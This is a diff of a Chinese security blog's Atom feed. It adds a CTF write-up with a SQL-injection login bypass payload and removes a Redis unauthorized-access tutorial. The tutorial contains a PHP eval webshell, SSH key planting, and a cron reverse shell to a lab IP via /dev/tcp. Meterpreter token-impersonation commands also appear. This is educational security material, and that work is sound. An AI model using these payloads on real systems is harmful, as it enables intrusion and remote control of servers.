@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://uknowsec.cn/"/>
-  <updated>2017-11-20T10:00:57.482Z</updated>
+  <updated>2017-11-25T05:50:49.550Z</updated>
   <id>http://uknowsec.cn/</id>
   
   <author>
@@ -14,6 +14,114 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>week 2 for cnas writeup</title>
+    <link href="http://uknowsec.cn/posts/ctf/week-2-for-cnas-writeup.html"/>
+    <id>http://uknowsec.cn/posts/ctf/week-2-for-cnas-writeup.html</id>
+    <published>2017-11-25T03:41:12.000Z</published>
+    <updated>2017-11-25T05:50:49.550Z</updated>
+    
+    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="火星文-50"><a href="#火星文-50" class="headerlink" title="火星文 50"></a>火星文 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/" target="_blank" rel="external">http://47.100.121.220:28001/</a></p>
+<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>看到题目就判断为javascript的题目，把火星人A和火星人B的内容复制粘贴到控制台</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E7%81%AB%E6%98%9F%E6%96%87.png" alt=""></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E7%81%AB%E6%98%9F%E6%96%872.png" alt=""></p>
+<p>A跑出来是一串密文，B跑出来是一个解密脚本</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/base6.png" alt=""></p>
+<h2 id="用户登录-100"><a href="#用户登录-100" class="headerlink" title="用户登录 100"></a>用户登录 100</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002/" target="_blank" rel="external">http://47.100.121.220:28002/</a></p>
+<h3 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h3><p>mysql_query() 函数</p>
+<p>mysql_query() 函数执行一条 MySQL 查询。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_query(query,connection)</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>query</td>
+<td style="text-align:center">必需。规定要发送的 SQL 查询。注释：查询字符串不应以分号结束。</td>
+</tr>
+<tr>
+<td>connection</td>
+<td style="text-align:center">可选。规定 SQL 连接标识符。如果未规定，则使用上一个打开的连接。</td>
+</tr>
+</tbody>
+</table>
+<p>mysql_fetch_array() 函数</p>
+<p>mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有<br>返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_fetch_array(data,array_type)</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>data</td>
+<td style="text-align:center">可选。规定要使用的数据指针。该数据指针是 mysql_query() 函数产生的结果。</td>
+</tr>
+<tr>
+<td>array_type</td>
+<td style="text-align:center">可选。规定返回哪种结果。可能的值：MYSQL_ASSOC - 关联数组 MYSQL_NUM - 数字数组 MYSQL_BOTH - 默认。同时产生关联和数字数组</td>
+</tr>
+</tbody>
+</table>
+<p>strcasecmp() 函数</p>
+<p>strcasecmp() 函数比较两个字符串。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strcasecmp(string1,string2)</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>string1</td>
+<td style="text-align:center">必需。规定要比较的第一个字符串。</td>
+</tr>
+<tr>
+<td>string2</td>
+<td style="text-align:center">必需。规定要比较的第二个字符串。</td>
+</tr>
+</tbody>
+</table>
+<p>以上是本题涉及到的几个函数。</p>
+<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include &quot;config.php&quot;;</div><div class="line">include &quot;flag.php&quot;;</div><div class="line"></div><div class="line">show_source(__FILE__);</div><div class="line">if( isset($_POST[&quot;user&quot;]) &amp;&amp; isset($_POST[&quot;pass&quot;])) &#123;</div><div class="line">    $user = $_POST[&quot;user&quot;];</div><div class="line">    $pass = md5($_POST[&quot;pass&quot;]);</div><div class="line">    $auth = false;</div><div class="line">    </div><div class="line">    $conn = mysql_connect($db_host, $db_user, $db_pass) or die(&quot;Unable to connect!&quot;);</div><div class="line">    mysql_select_db($db_name) or die(&quot;Unable to select database!&quot;);</div><div class="line">    </div><div class="line">    $sql = &quot;select password from user where user=&apos;$user&apos;&quot;;</div><div class="line">    $query = mysql_query($sql);</div><div class="line">    if(!$query) &#123;</div><div class="line">        mysql_close($conn);</div><div class="line">        die(&quot;login failed!&quot;);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    $row = mysql_fetch_array($query, MYSQL_ASSOC);</div><div class="line">    if($row[&quot;password&quot;] &amp;&amp; !strcasecmp($pass,$row[&quot;password&quot;])) &#123;</div><div class="line">        $auth = true;</div><div class="line">    &#125;</div><div class="line">    mysql_close($conn);</div><div class="line">    </div><div class="line">    if($auth) &#123;</div><div class="line">        echo &quot;login success!&quot;;</div><div class="line">        echo $flag;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        die(&quot;login failed!&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = &quot;select password from user where user=&apos;$user&apos;</div></pre></td></tr></table></figure>
+<p>是存在SQL注入的，但是用户名和密码是分开判断。所以普通的万能密码是不行的。</p>
+<p>\$row[“password”]的值是从$sql提取出来的,<br>然后经过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$row[&quot;password&quot;] &amp;&amp; !strcasecmp($pass,$row[&quot;password&quot;])</div></pre></td></tr></table></figure></p>
+<p>进行密码判断。</p>
+<p>我们可以构造如下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;AND 0=1 UNION SELECT md(1) #</div></pre></td></tr></table></figure>
+<p>拼接到\$sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = &quot;select password from user where user=&apos;&apos;AND 0=1 UNION SELECT md(1) #&quot;</div></pre></td></tr></table></figure></p>
+<ol>
+<li>最前面的单引号：闭合原文的where user=’</li>
+<li>AND 0=1:为了使前面的表达式返回值为空.</li>
+<li>接着我们使用UNION SELECT MD5(1)，直接把MD5值作为返回值retuen给$sql，这样在查询的时候$query就会有值.</li>
+<li>最后的#用来注释掉后面没用的东西</li>
+</ol>
+<p>因此<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">username:&apos; and 0=1 union select md5(1)#</div><div class="line">password:1</div></pre></td></tr></table></figure></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/sqlsql.png" alt=""></p>
+<h2 id="You-have-no-permissions-150"><a href="#You-have-no-permissions-150" class="headerlink" title="You have no permissions 150"></a>You have no permissions 150</h2>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;点击阅读全文&lt;br&gt;
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>php内置过滤函数总结</title>
@@ -730,7 +838,7 @@
 <h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#58;&#x66;&#111;&#x6f;&#64;&#98;&#x61;&#114;&#x2e;&#x63;&#x6f;&#x6d;">&#x66;&#111;&#x6f;&#64;&#98;&#x61;&#114;&#x2e;&#x63;&#x6f;&#x6d;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#58;&#x66;&#111;&#x6f;&#x40;&#98;&#97;&#114;&#x2e;&#99;&#111;&#x6d;">&#x66;&#111;&#x6f;&#x40;&#98;&#97;&#114;&#x2e;&#99;&#111;&#x6d;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
@@ -2263,67 +2371,6 @@
 <p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon1.jpg" alt=""></p>
 <h3 id="窃取及伪造域账户-token"><a href="#窃取及伪造域账户-token" class="headerlink" title="窃取及伪造域账户 token"></a>窃取及伪造域账户 token</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">load incognito</div><div class="line">list_tokens -u</div><div class="line">impersonate_token xxxxx\\xxxxxxx</div><div class="line">execute -f cmd.exe -i -t</div></pre></td></tr></table></figure>
 <p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon6.jpg" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;点击阅读全文&lt;br&gt;
-    
-    </summary>
-    
-      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>配置漏洞之redis未授权访问</title>
-    <link href="http://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bredis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html"/>
-    <id>http://uknowsec.cn/posts/skill/配置漏洞之redis未授权访问.html</id>
-    <published>2017-07-12T09:35:01.000Z</published>
-    <updated>2017-07-17T07:55:42.821Z</updated>
-    
-    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
-<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h3><p>解压缩后编译源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ wget http://download.redis.io/releases/redis-2.8.3.tar.gz</div><div class="line">$ tar xzf redis-2.8.3.tar.gz</div><div class="line">$ cd redis-2.8.3</div><div class="line">$ make</div></pre></td></tr></table></figure></p>
-<h3 id="编译完成后"><a href="#编译完成后" class="headerlink" title="编译完成后"></a>编译完成后</h3><p>在Src目录下，有四个可执行文件redis-server、redis-benchmark、redis-cli和redis.conf。然后拷贝到一个目录下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mkdir /usr/redis</div><div class="line">cp redis-server  /usr/redis</div><div class="line">cp redis-benchmark /usr/redis</div><div class="line">cp redis-cli  /usr/redis</div><div class="line">cp redis.conf  /usr/redis</div><div class="line">cd /usr/redis</div></pre></td></tr></table></figure>
-<h3 id="启动redis服务"><a href="#启动redis服务" class="headerlink" title="启动redis服务"></a>启动redis服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./redis-server ./redis.conf</div></pre></td></tr></table></figure>
-<h3 id="查看redis是否开启"><a href="#查看redis是否开启" class="headerlink" title="查看redis是否开启"></a>查看redis是否开启</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -ntlp | grep redis</div></pre></td></tr></table></figure>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
-<li>保存到www目录，创建webshell</li>
-<li>创建SSH authorized_keys文件</li>
-<li>写计划任务（/var/spool/cron/&amp;/etc/cron.d/）</li>
-<li>slave of 8.8.8.8主从模式利用</li>
-<li>写入到/etc/profile.d/用户环境变量</li>
-<li>开启AOF持久化纯文本记录appendfilename</li>
-</ul>
-<h3 id="利用nmap获取redis信息"><a href="#利用nmap获取redis信息" class="headerlink" title="利用nmap获取redis信息"></a>利用nmap获取redis信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -A -p6379 --script=redis-info 192.168.132.134</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis1.jpg" alt=""></p>
-<h3 id="利用redis客户端进行未授权访问"><a href="#利用redis客户端进行未授权访问" class="headerlink" title="利用redis客户端进行未授权访问"></a>利用redis客户端进行未授权访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./redis-cli -h 192.168.132.134</div><div class="line">192.168.132.134:6379&gt; info</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis2.jpg" alt=""></p>
-<p>当然，如果redis存在访问密码的话，可以使用如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./redis-cli -h 192.168.132.134 –a [password]</div></pre></td></tr></table></figure></p>
-<h3 id="利用redis连接写入ssh公钥"><a href="#利用redis连接写入ssh公钥" class="headerlink" title="利用redis连接写入ssh公钥"></a>利用redis连接写入ssh公钥</h3><h4 id="在攻击机上生成ssh公钥和私钥"><a href="#在攻击机上生成ssh公钥和私钥" class="headerlink" title="在攻击机上生成ssh公钥和私钥"></a>在攻击机上生成ssh公钥和私钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis3.jpg" alt=""></p>
-<h4 id="将公钥写入文本"><a href="#将公钥写入文本" class="headerlink" title="将公钥写入文本"></a>将公钥写入文本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd ~/.ssh/</div><div class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt; 1.txt</div></pre></td></tr></table></figure>
-<h4 id="将1-txt写入redis"><a href="#将1-txt写入redis" class="headerlink" title="将1.txt写入redis"></a>将1.txt写入redis</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat 1.txt | /usr/local/redis/./redis-cli -h 192.168.132.134 -x set crack</div></pre></td></tr></table></figure>
-<h4 id="利用redis客户端连接靶机redis"><a href="#利用redis客户端连接靶机redis" class="headerlink" title="利用redis客户端连接靶机redis"></a>利用redis客户端连接靶机redis</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./redis-cli -h 192.168.132.134</div></pre></td></tr></table></figure>
-<h4 id="获取redis备份的路径"><a href="#获取redis备份的路径" class="headerlink" title="获取redis备份的路径"></a>获取redis备份的路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG GET dir</div></pre></td></tr></table></figure>
-<h4 id="更改redis备份路径"><a href="#更改redis备份路径" class="headerlink" title="更改redis备份路径"></a>更改redis备份路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG SET dir /root/.ssh</div></pre></td></tr></table></figure>
-<h4 id="设置备份文件的名称为authorized-keys"><a href="#设置备份文件的名称为authorized-keys" class="headerlink" title="设置备份文件的名称为authorized_keys"></a>设置备份文件的名称为authorized_keys</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG SET dbfilename authorized_keys</div></pre></td></tr></table></figure>
-<h4 id="检查是否更改"><a href="#检查是否更改" class="headerlink" title="检查是否更改"></a>检查是否更改</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; CONFIG GET dbfilename</div></pre></td></tr></table></figure>
-<h4 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192.168.132.134:6379&gt; save</div></pre></td></tr></table></figure>
-<h4 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh –i  id_rsa root@192.168.1.11</div></pre></td></tr></table></figure>
-<h3 id="利用redis写入Shell"><a href="#利用redis写入Shell" class="headerlink" title="利用redis写入Shell"></a>利用redis写入Shell</h3><h4 id="查看是否存在web服务"><a href="#查看是否存在web服务" class="headerlink" title="查看是否存在web服务"></a>查看是否存在web服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap 192.168.1.111</div></pre></td></tr></table></figure>
-<h4 id="确定web服务目录"><a href="#确定web服务目录" class="headerlink" title="确定web服务目录"></a>确定web服务目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">config set dir /usr/local/apache/htdocs/</div><div class="line">config set dbfilename ok.php </div><div class="line">set test &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;</div><div class="line">save</div></pre></td></tr></table></figure>
-<h4 id="菜刀连接一句话木马"><a href="#菜刀连接一句话木马" class="headerlink" title="菜刀连接一句话木马"></a>菜刀连接一句话木马</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli0.png" alt=""></p>
-<h3 id="写计划任务来反弹shell"><a href="#写计划任务来反弹shell" class="headerlink" title="写计划任务来反弹shell"></a>写计划任务来反弹shell</h3><h4 id="telnet登录-也可以redis-cli登录"><a href="#telnet登录-也可以redis-cli登录" class="headerlink" title="telnet登录/也可以redis-cli登录"></a>telnet登录/也可以redis-cli登录</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli1.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">telnet 192.168.236.130 6379 //未授权登录</div><div class="line"></div><div class="line">config set dir /var/spool/cron/ //配置文件夹的路径（CONFIG SET 命令可以动态地调整 Redis 服务器的配置而(configuration)而无须重启。）//每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面</div><div class="line"></div><div class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.236.129/9999 0&gt;&amp;1\n\n\n&quot; //直接往当前用户的crontab里写入反弹shell，换行是必不可少的。</div></pre></td></tr></table></figure>
-<h4 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli2.png" alt=""></p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
-<li>禁止使用 root 权限启动 redis 服务；</li>
-<li>对 redis 访问启用密码认证，并且添加 IP 访问限制；</li>
-<li>尽可能不对公网直接开放 SSH 服务。</li>
-</ul>
 ]]></content>
     
     <summary type="html">
